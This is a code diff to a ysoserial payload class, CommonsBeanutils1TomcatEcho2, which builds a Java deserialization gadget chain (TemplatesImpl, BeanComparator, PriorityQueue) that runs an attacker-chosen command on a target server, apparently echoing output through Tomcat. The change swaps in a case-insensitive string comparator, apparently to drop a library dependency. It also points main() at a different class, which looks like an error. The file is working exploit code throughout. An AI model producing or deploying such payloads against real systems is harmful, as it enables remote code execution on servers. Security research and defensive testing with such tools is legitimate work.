@@ -1,25 +1,32 @@
 package ysoserial.payloads;
 
+import java.math.BigInteger;
+import java.util.PriorityQueue;
+
 import org.apache.commons.beanutils.BeanComparator;
+
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-import java.math.BigInteger;
-import java.util.PriorityQueue;
-
+@SuppressWarnings({ "rawtypes", "unchecked" })
+@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
+@Authors({ Authors.FROHOFF })
 public class CommonsBeanutils1TomcatEcho2 implements ObjectPayload<Object> {
 
     public Object getObject(final String command) throws Exception {
         final Object templates = Gadgets.createTemplatesImplTomcatEcho2(command);
         // mock method name until armed
-        final BeanComparator comparator = new BeanComparator("lowestSetBit");
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        //final BeanComparator comparator = new BeanComparator("lowestSetBit");
 
         // create queue with numbers and basic comparator
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
         // stub data for replacement later
-        queue.add(new BigInteger("1"));
-        queue.add(new BigInteger("1"));
+        queue.add("1");
+        queue.add("1");
 
         // switch method called by comparator
         Reflections.setFieldValue(comparator, "property", "outputProperties");
@@ -33,6 +40,6 @@ public class CommonsBeanutils1TomcatEcho2 implements ObjectPayload<Object> {
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsBeanutils1TomcatEcho2.class, args);
+        PayloadRunner.run(CommonsBeanutils1.class, args);
     }
 }
